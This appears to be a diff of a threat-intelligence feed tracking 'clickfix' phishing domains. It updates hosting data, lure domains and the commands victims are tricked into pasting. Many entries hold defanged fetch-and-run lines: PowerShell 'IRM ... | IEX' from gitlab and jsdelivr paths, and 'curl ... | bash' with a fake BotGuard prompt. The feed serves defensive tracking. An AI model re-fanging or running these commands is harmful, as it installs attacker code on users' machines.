@@ -255676,6 +255617,7 @@
    "actor": null,
    "actor_link": null,
    "commands": [
+    "IRM gitlab[.]com/amber-ffa-f15a6b/01a1db1b-d21d-70c0-971b-[id]/-/raw/main/01a1db1b-d21d-70c0-971b-[id] | IEX",
     "IRM fastly[.]jsdelivr[.]net/g\"h\"/sdf4563jvn/[id]/a379-[id] | IEX"
    ],
    "connects_to": [],
@@ -256346,8 +256288,9 @@
    ],
    "lure_from": [
     "thu-ipad-03.cfd",
-    "yaponovosh.org",
+    "biboiboboorl.org",
     "mon-blanc-02.cfd",
+    "yaponovosh.org",
     "efreitorher.org",
     "nikogdatakonebilo.cc"
    ]
@@ -258534,10 +258477,12 @@
    "actor": null,
    "actor_link": null,
    "commands": [
-    "/bin/bash -c \"$(curl -A 'Mac OS X 10_15_7' -fsSL 'pk7elyc0[.]marya[.]store/?ublib=2c9caf96-dcd4-49e3-a02c-[id]')\"; echo \"\"BotGuard: Answer the protector challenge. Ref: 73282",
-    "IRM fastly[.]jsdelivr[.]net/g\"h\"/sdf4563jvn/[id]/a379-[id] | IEX"
+    "/bin/bash -c \"$(curl -A 'Mac OS X 10_15_7' -fsSL 'l9h08gsy[.]udap[.]store/?ublib=04978c48-f201-4a1c-b157-[id]')\"; echo \"\"BotGuard: Answer the protector challenge. Ref: 73282",
+    "IRM gitlab[.]com/amber-ffa-f15a6b/01a1db1b-d21d-70c0-971b-[id]/-/raw/main/01a1db1b-d21d-70c0-971b-[id] | IEX",
+    "/bin/bash -c \"$(curl -A 'Mac OS X 10_15_7' -fsSL 'pk7elyc0[.]marya[.]store/?ublib=2c9caf96-dcd4-49e3-a02c-[id]')\"; echo \"\"BotGuard: Answer the protector challenge. Ref: 73282"
    ],
    "connects_to": [
+    "l9h08gsy.udap.store",
     "pk7elyc0.marya.store"
    ],
    "lure_from": []
@@ -260025,7 +259970,7 @@
    "role": "Redirector",
    "status": "offline",
    "first_seen": "2026-10-23",
-   "last_seen": "2026-11-14",
+   "last_seen": "2026-11-15",
    "last_online": "2026-11-15",
    "offline_since": "2026-11-15",
    "url": "https://tahorataps.com/",
@@ -260043,7 +259988,7 @@
      "asn": "AS204213",
      "org": "netmihan Netmihan Communication Company Ltd, IR",
      "first_seen": "2026-10-23",
-     "last_seen": "2026-11-14"
+     "last_seen": "2026-11-15"
     }
    ],
    "hosts": [
@@ -260051,7 +259996,7 @@
      "host": "tahorataps.com",
      "status": "offline",
      "first_seen": "2026-10-23",
-     "last_seen": "2026-11-14"
+     "last_seen": "2026-11-15"
     }
    ],
    "actor": null,
@@ -260700,6 +260645,7 @@
    "actor": null,
    "actor_link": null,
    "commands": [
+    "IRM gitlab[.]com/amber-ffa-f15a6b/01a1db1b-d21d-70c0-971b-[id]/-/raw/main/01a1db1b-d21d-70c0-971b-[id] | IEX",
     "IRM fastly[.]jsdelivr[.]net/g\"h\"/sdf4563jvn/[id]/a379-[id] | IEX"
    ],
    "connects_to": [],
@@ -260801,6 +260747,7 @@
    ],
    "lure_from": [
     "mon-blanc-02.cfd",
+    "biboiboboorl.org",
     "yaponovosh.org",
     "efreitorher.org",
     "nikogdatakonebilo.cc"
@@ -264503,12 +264450,13 @@
    "commands": [
     "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/proliv2929' >/dev/null",
     "(irm 'hxxps[:]//t-trustrest[.]com/proliv2929/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex",
-    "(irm 'hxxps[:]//trustchecknes[.]com/proliv2929/[id]')|iex"
+    "irm 'browse-cloud[.]codes/[id]'|iex"
    ],
    "connects_to": [
     "xorados.com",
     "groverudder12.com",
     "t-trustrest.com",
+    "browse-cloud.codes",
     "trustchecknes.com",
     "ncheck-brows.beer"
    ],
@@ -264610,6 +264558,7 @@
    "actor": null,
    "actor_link": null,
    "commands": [
+    "IRM gitlab[.]com/amber-ffa-f15a6b/01a1db1b-d21d-70c0-971b-[id]/-/raw/main/01a1db1b-d21d-70c0-971b-[id] | IEX",
     "IRM fastly[.]jsdelivr[.]net/g\"h\"/sdf4563jvn/[id]/a379-[id] | IEX"
    ],
    "connects_to": [],
@@ -266277,6 +266226,7 @@
    "actor": null,
    "actor_link": null,
    "commands": [
+    "IRM gitlab[.]com/amber-ffa-f15a6b/01a1db1b-d21d-70c0-971b-[id]/-/raw/main/01a1db1b-d21d-70c0-971b-[id] | IEX",
     "IRM fastly[.]jsdelivr[.]net/g\"h\"/sdf4563jvn/[id]/a379-[id] | IEX"
    ],
    "connects_to": [],
@@ -266323,6 +266273,7 @@
    "actor": null,
    "actor_link": null,
    "commands": [
+    "IRM gitlab[.]com/amber-ffa-f15a6b/01a1db1b-d21d-70c0-971b-[id]/-/raw/main/01a1db1b-d21d-70c0-971b-[id] | IEX",
     "IRM fastly[.]jsdelivr[.]net/g\"h\"/sdf4563jvn/[id]/a379-[id] | IEX"
    ],
    "connects_to": [],
@@ -267001,6 +266952,7 @@
    "actor": null,
    "actor_link": null,
    "commands": [
+    "IRM gitlab[.]com/amber-ffa-f15a6b/01a1db1b-d21d-70c0-971b-[id]/-/raw/main/01a1db1b-d21d-70c0-971b-[id] | IEX",
     "IRM fastly[.]jsdelivr[.]net/g\"h\"/sdf4563jvn/[id]/a379-[id] | IEX"
    ],
    "connects_to": [],
@@ -269267,12 +269219,13 @@
    ],
    "connects_to": [
     "xorados.com",
-    "t-trustrest.com",
     "hagosuro.lc",
+    "t-trustrest.com",
     "groverudder12.com",
     "trek-72.com",
     "trustchecknes.com",
-    "t-trustresnew.com"
+    "t-trustresnew.com",
+    "lepafonso.bz"
    ],
    "lure_from": [
     "interseq.at"
@@ -274479,6 +274432,7 @@
    "actor": null,
    "actor_link": null,
    "commands": [
+    "IRM gitlab[.]com/amber-ffa-f15a6b/01a1db1b-d21d-70c0-971b-[id]/-/raw/main/01a1db1b-d21d-70c0-971b-[id] | IEX",
     "IRM fastly[.]jsdelivr[.]net/g\"h\"/sdf4563jvn/[id]/a379-[id] | IEX"
    ],
    "connects_to": [],
@@ -276032,6 +275986,7 @@
    "actor_link": null,
    "commands": [
     "IRM fastly[.]jsdelivr[.]net/g\"h\"/Katy7684/1d34ada-114e-43c6-b277-9805448b8Df/BE5-4532-a7E5-AE1a29 | IEX",
+    "IRM gitlab[.]com/amber-ffa-f15a6b/01a1db1b-d21d-70c0-971b-[id]/-/raw/main/01a1db1b-d21d-70c0-971b-[id] | IEX",
     "IRM fastly[.]jsdelivr[.]net/g\"h\"/sdf4563jvn/[id]/a379-[id] | IEX"
    ],
    "connects_to": [],
@@ -276473,6 +276428,7 @@
    "actor": null,
    "actor_link": null,
    "commands": [
+    "IRM gitlab[.]com/amber-ffa-f15a6b/01a1db1b-d21d-70c0-971b-[id]/-/raw/main/01a1db1b-d21d-70c0-971b-[id] | IEX",
     "IRM fastly[.]jsdelivr[.]net/g\"h\"/sdf4563jvn/[id]/a379-[id] | IEX"
    ],
    "connects_to": [],
@@ -277619,10 +277575,12 @@
    "actor": null,
    "actor_link": null,
    "commands": [
-    "/bin/bash -c \"$(curl -A 'Mac OS X 10_15_7' -fsSL 'i8ojm9tv[.]marya[.]store/?ublib=2d9d942d-bbfb-4fa3-bfb6-[id]')\"; echo \"\"BotGuard: Answer the protector challenge. Ref: 73282",
-    "IRM fastly[.]jsdelivr[.]net/g\"h\"/sdf4563jvn/[id]/a379-[id] | IEX"
+    "/bin/bash -c \"$(curl -A 'Mac OS X 10_15_7' -fsSL 'taw95ckf[.]udap[.]store/?ublib=5bcded3e-d9f9-4790-a397-[id]')\"; echo \"\"BotGuard: Answer the protector challenge. Ref: 73282",
+    "IRM gitlab[.]com/amber-ffa-f15a6b/01a1db1b-d21d-70c0-971b-[id]/-/raw/main/01a1db1b-d21d-70c0-971b-[id] | IEX",
+    "/bin/bash -c \"$(curl -A 'Mac OS X 10_15_7' -fsSL 'i8ojm9tv[.]marya[.]store/?ublib=2d9d942d-bbfb-4fa3-bfb6-[id]')\"; echo \"\"BotGuard: Answer the protector challenge. Ref: 73282"
    ],
    "connects_to": [
+    "taw95ckf.udap.store",
     "i8ojm9tv.marya.store"
    ],
    "lure_from": []
@@ -279137,6 +279095,7 @@
    "actor": null,
    "actor_link": null,
    "commands": [
+    "IRM gitlab[.]com/amber-ffa-f15a6b/01a1db1b-d21d-70c0-971b-[id]/-/raw/main/01a1db1b-d21d-70c0-971b-[id] | IEX",
     "IRM fastly[.]jsdelivr[.]net/g\"h\"/sdf4563jvn/[id]/a379-[id] | IEX"
    ],
    "connects_to": [],
@@ -282337,6 +282296,7 @@
    "actor": null,
    "actor_link": null,
    "commands": [
+    "IRM gitlab[.]com/amber-ffa-f15a6b/01a1db1b-d21d-70c0-971b-[id]/-/raw/main/01a1db1b-d21d-70c0-971b-[id] | IEX",
     "/bin/bash -c \"$(curl -A 'Mac OS X 10_15_7' -fsSL 'kvpxc4a8[.]marya[.]store/?ublib=12657265-f170-40f4-a2db-[id]')\"; echo \"\"BotGuard: Answer the protector challenge. Ref: 73282",
     "IRM fastly[.]jsdelivr[.]net/g\"h\"/sdf4563jvn/[id]/a379-[id] | IEX"
    ],
@@ -282962,6 +282922,54 @@
    ]
   },
   {
+   "indicator": "vantilenj.com",
+   "type": "domain",
+   "category": "clickfix",
+   "backend_for": null,
+   "campaign": null,
+   "role": "Phishing page",
+   "status": "online",
+   "first_seen": "2026-11-15",
+   "last_seen": "2026-11-15",
+   "last_online": "2026-11-15",
+   "offline_since": null,
+   "url": "https://vantilenj.com/",
+   "brand": null,
+   "product": null,
+   "hosting": "Oracle Cloud",
+   "dns": "Newfold",
+   "ip": "50.87.146.167",
+   "asn": "AS31898",
+   "org": "ORACLE-BMC-31898 - Oracle Corporation, US",
+   "country": "US",
+   "ips": [
+    {
+     "ip": "50.87.146.167",
+     "asn": "AS31898",
+     "org": "ORACLE-BMC-31898 - Oracle Corporation, US",
+     "first_seen": "2026-11-15",
+     "last_seen": "2026-11-15"
+    }
+   ],
+   "hosts": [
+    {
+     "host": "vantilenj.com",
+     "status": "online",
+     "first_seen": "2026-11-15",
+     "last_seen": "2026-11-15"
+    }
+   ],
+   "actor": null,
+   "actor_link": null,
+   "commands": [
+    "irm 'browse-cloud[.]codes/[id]'|iex"
+   ],
+   "connects_to": [
+    "browse-cloud.codes"
+   ],
+   "lure_from": []
+  },
+  {
    "indicator": "vantrexindustries.com",
    "type": "domain",
    "category": "clickfix",
@@ -283189,6 +283197,7 @@
    "actor": null,
    "actor_link": null,
    "commands": [
+    "IRM gitlab[.]com/amber-ffa-f15a6b/01a1db1b-d21d-70c0-971b-[id]/-/raw/main/01a1db1b-d21d-70c0-971b-[id] | IEX",
     "IRM fastly[.]jsdelivr[.]net/g\"h\"/sdf4563jvn/[id]/a379-[id] | IEX"
    ],
    "connects_to": [],
@@ -284412,6 +284421,7 @@
    "actor": null,
    "actor_link": null,
    "commands": [
+    "IRM gitlab[.]com/amber-ffa-f15a6b/01a1db1b-d21d-70c0-971b-[id]/-/raw/main/01a1db1b-d21d-70c0-971b-[id] | IEX",
     "/bin/bash -c \"$(curl -A 'Mac OS X 10_15_7' -fsSL 'pg1171u9[.]marya[.]store/?ublib=7096a02f-8540-4a10-b34b-[id]')\"; echo \"\"BotGuard: Answer the protector challenge. Ref: 73282",
     "IRM fastly[.]jsdelivr[.]net/g\"h\"/sdf4563jvn/[id]/a379-[id] | IEX"
    ],
@@ -286086,6 +286096,7 @@
    "actor": null,
    "actor_link": null,
    "commands": [
+    "IRM gitlab[.]com/amber-ffa-f15a6b/01a1db1b-d21d-70c0-971b-[id]/-/raw/main/01a1db1b-d21d-70c0-971b-[id] | IEX",
     "IRM fastly[.]jsdelivr[.]net/g\"h\"/sdf4563jvn/[id]/a379-[id] | IEX"
    ],
    "connects_to": [],
@@ -286673,6 +286684,7 @@
    "actor": null,
    "actor_link": null,
    "commands": [
+    "IRM gitlab[.]com/amber-ffa-f15a6b/01a1db1b-d21d-70c0-971b-[id]/-/raw/main/01a1db1b-d21d-70c0-971b-[id] | IEX",
     "/bin/bash -c \"$(curl -A 'Mac OS X 10_15_7' -fsSL 'rgdvkb08[.]marya[.]store/?ublib=7914c433-bd33-4faa-83d7-[id]')\"; echo \"\"BotGuard: Answer the protector challenge. Ref: 73282",
     "IRM fastly[.]jsdelivr[.]net/g\"h\"/sdf4563jvn/[id]/a379-[id] | IEX"
    ],
@@ -286730,6 +286742,7 @@
    "actor_link": null,
    "commands": [
     "IRM fastly[.]jsdelivr[.]net/g\"h\"/Katy7684/1d34ada-114e-43c6-b277-9805448b8Df/BE5-4532-a7E5-AE1a29 | IEX",
+    "IRM gitlab[.]com/amber-ffa-f15a6b/01a1db1b-d21d-70c0-971b-[id]/-/raw/main/01a1db1b-d21d-70c0-971b-[id] | IEX",
     "IRM fastly[.]jsdelivr[.]net/g\"h\"/sdf4563jvn/[id]/a379-[id] | IEX"
    ],
    "connects_to": [],
@@ -287646,6 +287659,7 @@
    "actor": null,
    "actor_link": null,
    "commands": [
+    "IRM gitlab[.]com/amber-ffa-f15a6b/01a1db1b-d21d-70c0-971b-[id]/-/raw/main/01a1db1b-d21d-70c0-971b-[id] | IEX",
     "IRM fastly[.]jsdelivr[.]net/g\"h\"/sdf4563jvn/[id]/a379-[id] | IEX"
    ],
    "connects_to": [],
@@ -287889,6 +287903,7 @@
    "actor": null,
    "actor_link": null,
    "commands": [
+    "IRM gitlab[.]com/amber-ffa-f15a6b/01a1db1b-d21d-70c0-971b-[id]/-/raw/main/01a1db1b-d21d-70c0-971b-[id] | IEX",
     "IRM fastly[.]jsdelivr[.]net/g\"h\"/sdf4563jvn/[id]/a379-[id] | IEX"
    ],
    "connects_to": [],
@@ -289327,6 +289342,7 @@
    "actor": null,
    "actor_link": null,
    "commands": [
+    "IRM gitlab[.]com/amber-ffa-f15a6b/01a1db1b-d21d-70c0-971b-[id]/-/raw/main/01a1db1b-d21d-70c0-971b-[id] | IEX",
     "IRM fastly[.]jsdelivr[.]net/g\"h\"/sdf4563jvn/[id]/a379-[id] | IEX"
    ],
    "connects_to": [],
@@ -290575,6 +290591,7 @@
    "actor": null,
    "actor_link": null,
    "commands": [
+    "IRM gitlab[.]com/amber-ffa-f15a6b/01a1db1b-d21d-70c0-971b-[id]/-/raw/main/01a1db1b-d21d-70c0-971b-[id] | IEX",
     "IRM fastly[.]jsdelivr[.]net/g\"h\"/sdf4563jvn/[id]/a379-[id] | IEX"
    ],
    "connects_to": [],
@@ -293915,9 +293932,12 @@
    "actor_link": null,
    "commands": [
     "IRM fastly[.]jsdelivr[.]net/g\"h\"/Katy7684/1d34ada-114e-43c6-b277-9805448b8Df/BE5-4532-a7E5-AE1a29 | IEX",
-    "IRM fastly[.]jsdelivr[.]net/g\"h\"/sdf4563jvn/[id]/a379-[id] | IEX"
+    "/bin/bash -c \"$(curl -A 'Mac OS X 10_15_7' -fsSL 'ykkicvcx[.]udap[.]store/?ublib=8c0361fb-3c8d-4335-898f-[id]')\"; echo \"\"BotGuard: Answer the protector challenge. Ref: 73282",
+    "IRM gitlab[.]com/amber-ffa-f15a6b/01a1db1b-d21d-70c0-971b-[id]/-/raw/main/01a1db1b-d21d-70c0-971b-[id] | IEX"
    ],
-   "connects_to": [],
+   "connects_to": [
+    "ykkicvcx.udap.store"
+   ],
    "lure_from": []
   },
   {
@@ -294102,7 +294122,8 @@
     "hagosuro.lc",
     "t-trustrest.com",
     "t-trustresnew.com",
-    "trustchecknes.com"
+    "trustchecknes.com",
+    "lepafonso.bz"
    ],
    "lure_from": [
     "interseq.at"
@@ -294812,10 +294833,11 @@
    "actor_link": null,
    "commands": [
     "IRM fastly[.]jsdelivr[.]net/g\"h\"/Katy7684/1d34ada-114e-43c6-b277-9805448b8Df/BE5-4532-a7E5-AE1a29 | IEX",
-    "/bin/bash -c \"$(curl -A 'Mac OS X 10_15_7' -fsSL 'pyurhtb2[.]lochnesshunters[.]com/?ublib=fff55f1e-4398-44d3-ae85-[id]')\"; echo \"\"BotGuard: Answer the protector challenge. Ref: 73282",
-    "IRM fastly[.]jsdelivr[.]net/g\"h\"/sdf4563jvn/[id]/a379-[id] | IEX"
+    "/bin/bash -c \"$(curl -A 'Mac OS X 10_15_7' -fsSL 'yb5zrtwt[.]udap[.]store/?ublib=c1334612-295d-4154-a302-[id]')\"; echo \"\"BotGuard: Answer the protector challenge. Ref: 73282",
+    "IRM gitlab[.]com/amber-ffa-f15a6b/01a1db1b-d21d-70c0-971b-[id]/-/raw/main/01a1db1b-d21d-70c0-971b-[id] | IEX"
    ],
    "connects_to": [
+    "yb5zrtwt.udap.store",
     "pyurhtb2.lochnesshunters.com"
    ],
    "lure_from": []
@@ -298417,6 +298439,7 @@
    "actor_link": null,
    "commands": [
     "IRM fastly[.]jsdelivr[.]net/g\"h\"/Katy7684/1d34ada-114e-43c6-b277-9805448b8Df/BE5-4532-a7E5-AE1a29 | IEX",
+    "IRM gitlab[.]com/amber-ffa-f15a6b/01a1db1b-d21d-70c0-971b-[id]/-/raw/main/01a1db1b-d21d-70c0-971b-[id] | IEX",
     "IRM fastly[.]jsdelivr[.]net/g\"h\"/sdf4563jvn/[id]/a379-[id] | IEX"
    ],
    "connects_to": [],
